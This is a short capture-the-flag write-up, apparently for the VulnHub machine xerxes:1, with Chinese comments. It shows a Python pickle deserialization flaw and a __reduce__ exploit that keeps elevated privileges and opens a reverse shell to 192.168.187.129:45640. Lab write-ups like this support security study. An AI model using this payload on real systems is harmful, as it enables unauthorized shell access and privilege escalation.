---
title: VulnHub xerxes：1
date: 2026-04-01 16:16:00
categories: 
  - VulnHub
tags:
  - RGBA 颜色解密
...
def load(filename):
    if len(filename) < 1:
        filename = "notes"
    f = open("/home/curtiz/" + filename, "rb")
    notes = pickle.load(f)        # 危险点：反序列化不受信任的数据
    f.close()
    return notes
```
...
class Exploit(object):
    # pickle 模块序列化对象时，如果对象定义了 __reduce__ 方法，那么序列化时就会调用该方法，返回一个元组
    def __reduce__(self):
        ...
        cmd = (
            ...
            # 导入 os、pty（伪终端）、socket 模块
            "os.setreuid(os.geteuid(), os.geteuid());" # 关键一步：将 RUID 设为 EUID
            
            # os.geteuid() 获取当前进程的有效用户 ID（EUID），os.setreuid() 将真实用户 ID（RUID）和有效用户 ID（EUID）都设置为 EUI
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            "s.connect((\"192.168.187.129\",45640));"
            
            # 创建一个 TCP socket，并连接到攻击者监听的 IP 和端口
            "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            
            # pty.spawn 会启动一个交互式 shell
            "pty.spawn(\"/bin/bash\")'"
        )
        # 这里返回了 (os.system, (cmd,))
        # os.system 会启动一个 shell 执行 cmd 字符串中的命令
        # 所以只要控制 cmd 的内容，就可以在反序列化的瞬间执行任意系统命令
